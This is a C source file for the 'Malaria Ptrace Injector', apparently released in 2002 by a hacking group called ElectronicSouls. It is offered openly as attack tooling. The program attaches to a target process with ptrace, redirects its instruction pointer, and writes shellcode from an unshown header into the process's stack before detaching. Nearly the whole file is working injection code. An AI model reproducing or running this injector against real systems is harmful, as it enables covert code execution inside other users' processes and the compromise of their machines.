/*
      ._______________  ._____________.   
      |              |\ |             |\         
      |______________|| |_____________||     
       \_____________\|  \____________\|  
      .________.             .________.  
      |        |\ Electronic |        |\    
      |  ._____||   Souls    |_____.  ||   
      |  |\____\|             \____|  ||     
      |  |_|_________.  .__________|  ||    
      |              |\ |             || 
      |______________|| |_____________|| 
       \_____________\|  \____________\| 

  [ElectronicSouls] --- http://www.0x4553.org
  -------------------------------------------
  Malaria Ptrace Injector (C) BrainStorm 2002
  public version. no error handling.

  greetz: 
         old XOR Team,UNF,SYNNERGY,void.ru,
         ADM,THC,IC,#vuln,#blackhat  
*/

#include <stdio.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <linux/user.h>
#include <unistd.h>
#include "malaria.h"


int main(int argc,char **argv)
{
        pid_t pid;

        if(!argv[1]){
          fprintf(stderr,"[ElectronicSouls] Malaria ptrace injector.\n");
          fprintf(stderr,"usage: %s <pid> \n",argv[0]);
          exit(-1);
        }

        fprintf(stderr,"\n [ElectronicSouls]\n");
        fprintf(stderr," malaria version: %s\n\n",VER);

        pid=atoi(argv[1]);  
        fprintf(stderr," calculating inject code size..\n");
        shellcode=malloc(strlen((char*) infcode)+4);   
        strcpy(shellcode,(char *) infcode);
        fprintf(stderr," - code size: %d\n",strlen(shellcode));
        fprintf(stderr," initializing infection\n");
        infect(pid);        

        fprintf(stderr," [infected!]\n\n");

        exit(0);
}

int infect(pid_t pid,int argc, char *argv[])
{
        int i=0,
            ptr,
            beg;
        struct user_regs_struct reg;

        fprintf(stderr," attaching to proccess: %d !\n",pid);

        ptrace(PTRACE_ATTACH,pid,0,0);    /* attaching to proccess */
        waitpid(pid,NULL,0);

        ptrace(PTRACE_GETREGS,pid,&reg,&reg);       /* general purpose registers */ 
        write(2," .",1);sleep(1);write(2,".",1);sleep(1);write(2,".",1);sleep(1);
        write(2,".",1);sleep(1);write(2,".",1);sleep(1);write(2,".",1);sleep(1);
        write(2,".",1);sleep(1);write(2,".",1);sleep(1);write(2,".",1);sleep(1);
        write(2,".\n",1);sleep(1); /* just for fun :P */
        fprintf(stderr," register info: \n");
        fprintf(stderr," -----------------------------------------------------------\n");
        fprintf(stderr," eax is at: 0x%.8lx\t",reg.eax);
        fprintf(stderr," ebx is at: 0x%.8lx\n",reg.ebx);
        fprintf(stderr," ecx is at: 0x%.8lx\t",reg.ecx);
        fprintf(stderr," eip is at: 0x%.8lx\n",reg.eip);
        fprintf(stderr," ------------------------------------------------------------\n\n");
        reg.esp -= 4;                                            /* decrement esp */
        fprintf(stderr," new esp: 0x%.8lx (-4)\n",reg.esp);

        ptrace(PTRACE_POKETEXT,pid,reg.esp,reg.eip);             /* poke eip -> esp */
        ptr = beg = reg.esp - 1024;                              /* inject esp - 1024 */
        fprintf(stderr," - injecting code into 0x%.8lx\n",beg);

        write(2," .",1);sleep(1);write(2,".",1);sleep(1);
        write(2,".",1);sleep(1);write(2,".",1);sleep(1);
        write(2,".",1);sleep(1);write(2,". ",1);sleep(1);

        reg.eip=(long) beg+2;                                    /* set eip as value of esp - 1024 */
        fprintf(stderr,"reg eip is at: 0x%.8lx\n",reg.eip);
        fprintf(stderr," copy general purpose registers\n"); 
        ptrace(PTRACE_SETREGS,pid,&reg,&reg);

        while(i<strlen(shellcode)){
          ptrace(PTRACE_POKETEXT,pid,ptr,(int)* (int *) (shellcode+i) ); 
          i+=4;ptr+=4;
        }

        fprintf(stderr," detaching from %d \n\n",pid);

        ptrace(PTRACE_DETACH,pid,0,0);    /* detach from proccess */
        return(0);
}

